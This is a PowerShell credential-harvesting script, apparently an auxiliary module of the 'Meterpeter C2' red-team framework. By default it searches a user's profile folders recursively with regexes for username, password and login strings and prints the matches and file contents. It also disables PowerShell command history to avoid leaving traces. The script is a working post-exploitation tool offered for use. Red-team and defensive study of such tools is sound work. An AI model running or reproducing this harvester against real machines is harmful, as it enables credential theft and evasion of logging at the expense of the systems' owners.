<#
.SYNOPSIS
   Search for strings inside files

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.9

.DESCRIPTION
   Auxiliary module of Meterpeter C2 that searchs for matching
   strings inside files recursive starting in input directory.

.NOTES
   Cmdlet displays the LineNumber where the strings have been found.
   Param -verb does not display file content if bigger than 300 lines.
   Param -Exclude '.txt' will add one more exclusion to the default list.
   Use | (pipe) command to split Strings\Regex (example: .txt|.ini|.bat).

   Regex examples:
   Cmdlet by default limmit the string to capture to 22 chars length but
   that can be changed by invoking -strlength parameter to defined length.

   Regex examples:
   Only grab passwords with 22 chars max length
   (^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:).{0,22}$)
     
.Parameter Path
   The directory where to start search recursive (default: $Env:USERPROFILE)

.Parameter String
   String or Regex (regex: ^(\s+U|U)ser.{0,6}(=|:)|^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:)|login.{0,2}(=|:))

.Parameter Exclude
   File extension to exclude (default: .zip|.tar|.rar|.7z|.img|.iso|.dll|.db|.mp4|.png|.jpg|.msi|.exe)

.Parameter OutFormat
   Display results in Format-Table or Format-List (default: Format-List)

.Parameter Verb
   Verbose output displays the file contents (default: false)

.Parameter StrLength
   The string to capture max length in chars (default: 22)

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:USERPROFILE" -String "password="
   Search for string 'password=' on %userprofile% files recursive

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -String "pass=|passwd=|password="
   Search for string 'pass= passwd= password=' on %temp% files recursive

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:USERPROFILE" -String "passw=" -Exclude ".txt"
   Search for string 'passw=' on %userprofile% files (without .txt extension) recursive.

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -String "User.{0,4}(=|:)|passw.{0,3}(=|:)"
   Strings 'passw=,passw:,passwo=,passwor=,password=,user=,usern=,userna=,usernam=,username='

.INPUTS
   None. You cannot pipe objects into Find-string.ps1

.OUTPUTS
   * Find strings inside files
      => Total of files scanned: [19]

   FileName    : creds.txt
   FullPath    : C:\Users\pedro\AppData\Local\Temp\creds.txt
   StringMatch : user=pedroUbuntu password=r00t3xp10it
   LineNumber  : 10

   FileName    : logins.log
   FullPath    : C:\Users\pedro\AppData\Local\Temp\logins.log
   StringMatch : UserName: Teams passw = r00tPassWd
   LineNumber  : 2 4
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://regexone.com/lesson/introduction_abcs
   https://towardsdatascience.com/regular-expressions-clearly-explained-with-examples-822d76b037b4
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$String="(^(\s+U|U)ser.{0,6}(=|:).[^$]{0,22}$)|(^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:).{0,22}$)|(^(\s+p|p)wd.{0,2}(=|:).{0,22}$)|(log(i|o)n.{0,2}(=|:).[^$]{0,22}$)",
   [string]$Exclude=".zip|.tar|.rar|.7z|.img|.iso|.dll|.db|.mp4|.png|.jpg|.msi|.exe",
   [string]$Path="$Env:USERPROFILE",
   [string]$OutFormat="Format-List",
   [string]$Verb="false",
   [int]$StrLength='22',
   [int]$Limmit='300'
)


$CmdletVersion = "v1.0.9"
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@Find-String $CmdletVersion {SSA@RedTeam}"


If(-not(Test-Path -Path "$Path"))
{
   write-host "`n   Error: cmdlet cant find the input directory.`n" -ForegroundColor Red
   return
}

## Make sure user input (-exclude) does not match any extensions in default list
If($Exclude -iNotMatch ".zip|.tar|.rar|.7z|.img|.iso|.dll|.db|.mp4|.png|.jpg|.msi|.exe")
{
   ## check if user input command
   # starts with a pipe (|) char
   If($Exclude -NotMatch '^(\|)')
   {
      ## Add Pipe to user input string
      $Exclude = "|"+"$Exclude" -join ''
   }

   ## Adding one more extension exclusion to cmdlet default exclusion list
   $Exclude = ".zip|.tar|.rar|.7z|.img|.iso|.dll|.db|.mp4|.png|.jpg|.msi|.exe"+"$Exclude" -join ''
}


## Store all file names fullpaths found (recursive search)
$FileNames = (Get-ChildItem -Path "$Path" -Recurse -EA SilentlyContinue | Where-Object {
   $_.PsIsContainer -NotMatch '^(True)$' -and $_.Name -iNotMatch "($Exclude)$"
}).FullName

## Count how many files have been found inside dir
$FilesCounter = (echo $FileNames|Measure-Object).Count
write-host "`n* Find strings inside files" -ForegroundColor Green

## Check if string match the cmdlet default string in the end.
If($String -Match '(0\)n\.\{0,2\}\(=|:\)\.\[\^\$\]\{0,22\}\$\))$')
{
   ## Add new groups to default string because meterpeter cant
   # escape the backticks that are escaping the double quotes.
   $String = "$String"+"|(`"password`":)|(`"username`":)" -join ''
}

## Define string to capture max length (xx chars)
$String = $String -replace "0,22","0,${StrLength}"


## Verbose (-verb 'true') outputs
If($Verb -iNotMatch '^(false)$')
{
   ## Check if user is using Regex
   If($String -Match '(\^|\||{|})')
   {
      write-host "  => " -ForegroundColor DarkYellow -NoNewline
      write-host "Regex: " -NoNewline
      write-host "($String)" -ForegroundColor Magenta   
   }
   Else
   {
      write-host "  => " -ForegroundColor DarkYellow -NoNewline
      write-host "String: " -NoNewline
      write-host "($String)" -ForegroundColor DarkYellow
   }
}

write-host "  => " -ForegroundColor DarkYellow -NoNewline
write-host "Total of files scanned: [" -NoNewline
If($OutFormat -iMatch "^(Format-Table|Table)$")
{
   write-host "$FilesCounter" -ForegroundColor DarkYellow -NoNewline
   write-host "]`n"
}
Else
{
   write-host "$FilesCounter" -ForegroundColor DarkYellow -NoNewline
   write-host "]`n`n"
}


$i = 0 #Success counter
## Loop trougth all filenames
ForEach($Token in $FileNames)
{
   ## Search for strings or regex inside file
   $MatchedString = (Get-Content -Path "$Token"|Select-String -Pattern "($String)" -EA SilentlyContinue)
   If($MatchedString -iMatch "$String")
   {
      ## Get filename description
      $Description = (Get-ChildItem -Path "$Token"|Select-Object *)
      If($Verb -iMatch '^(true)$'){$RawFile = Get-Content -Path "$Token"}
      $Name = $Description.PSChildName
      $Line = $MatchedString.LineNumber
      $Full = $Description.FullName
         $i = $i + 1

      ## Selection of the output format to use
      If($OutFormat -iMatch "^(Format-Table|Table)$")
      {
         If($Verb -iMatch "^(true)$")
         {
            ## verbose displays file contents
            [pscustomobject] @{
               Filename = $Name
               FullPath = $Full
               StringMatch = $MatchedString
               LineNumber = $Line
               FileContents = $RawFile
            }
         }
         Else
         {
            [pscustomobject] @{
               Filename = $Name
               FullPath = $Full
               StringMatch = $MatchedString
               LineNumber = $Line
            }
         }
      }
      Else
      {
         write-host "FileName     : $Name"
         write-host "FullPath     : $Full"
         write-host "StringMatch  : " -NoNewline
         write-host "$MatchedString" -ForegroundColor DarkGreen
         write-host "LineNumber   : " -NoNewline
         write-host "$Line" -ForegroundColor DarkYellow

         If($Verb -iMatch "^(true)$")
         {
            ## Check file length limmit
            If($Description.Length -lt $Limmit)
            {
               ## verbose displays file contents
               write-host "FileContents : `n"
               echo $RawFile
            }
            Else
            {
               write-host "FileContents : "-NoNewline
               write-host "[Limmit:$Limmit] "-NoNewline -ForegroundColor Yellow
               write-host "File its to big to display contents .." -ForegroundColor Red                       
            }
         }
         write-host ""
      }
   }
}


If($i -lt 1)
{
   write-host "   Error: fail to find any strings inside current directory.`n" -ForegroundColor Red
}